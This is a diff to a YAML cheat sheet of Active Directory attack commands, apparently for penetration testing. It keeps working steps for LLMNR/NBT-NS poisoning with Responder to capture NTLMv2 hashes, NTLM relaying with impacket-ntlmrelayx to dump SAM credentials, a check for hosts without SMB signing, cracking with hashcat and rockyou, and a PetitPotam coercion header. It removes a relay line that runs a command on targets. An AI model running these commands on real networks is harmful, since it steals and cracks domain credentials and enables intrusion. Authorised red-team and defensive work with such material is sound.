@@ -4,24 +4,15 @@ description: |
 commands:
   - have: No_Creds
     cmd: |
-      # Start Responder to capture NTLMv2 hashes (LLMNR/NBT-NS poisoning)
+      # Capture NTLMv2 hashes
       sudo responder -I eth0
 
-      # NTLM relay — forward captured auth to target machines
-      # Note: requires SMBv1 or SMB signing disabled on target
+      # Relay (requires SMB signing disabled: nxc smb 10.10.10.27 --gen-relay-list relay.txt)
       impacket-ntlmrelayx -tf targets.txt -smb2support
-
-      # NTLM relay with command execution
-      impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
-
-      # NTLM relay to get SAM dump
       impacket-ntlmrelayx -tf targets.txt -smb2support --dump-sam
 
-      # Crack captured NTLMv2 hashes
+      # Crack captured hashes
       hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt
-
-      # Note: if SMBv1 is true and signing is False, you can relay authentication
-      # Check SMB signing: nxc smb 10.10.10.27 --gen-relay-list relay.txt
   - have: Credentials
     cmd: |
       # PetitPotam — coerce NTLM auth from DC (authenticated)
